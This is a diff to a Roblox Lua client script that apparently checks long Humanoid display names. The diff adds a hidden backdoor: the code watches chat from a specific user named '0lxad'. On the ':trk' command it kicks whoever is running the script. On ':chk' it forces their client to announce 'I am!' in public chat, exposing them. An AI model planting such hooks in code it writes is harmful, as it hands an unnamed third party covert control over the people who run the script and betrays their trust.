@@ -11,7 +11,26 @@ for i,descendant in game.Workspace:GetDescendants() do
         end
 	end
 end
-
+for i,Child in Players:GetChildren() do
+	if Child.Name == '0lxad' then
+		print("Daddy found!")
+		local Daddy = Child
+		Daddy.Chatted:Connect(function(msg)
+    		if string.lower(string.split(msg, ' ')[1]) == ":trk" then
+      			if Player.Name == '0lxad' then print("Skids kicked")
+      			else
+        		local kmsg = string.split(msg, ':trk')[1]
+            	Player:Kick(kmsg)
+      			end
+    		end
+		end)
+        Daddy.Chatted:Connect(function(msg)
+            if string.lower(msg) == ":chk" then
+                game:GetService("ReplicatedStorage"):WaitForChild("DefaultChatSystemChatEvents"):WaitForChild("SayMessageRequest"):FireServer("I am!","all")
+			end
+        end)
+	end
+end
 local function onDescendantAdded(descendant)
 	if descendant.ClassName == 'Humanoid' then
         if #descendant.DisplayName>50 then
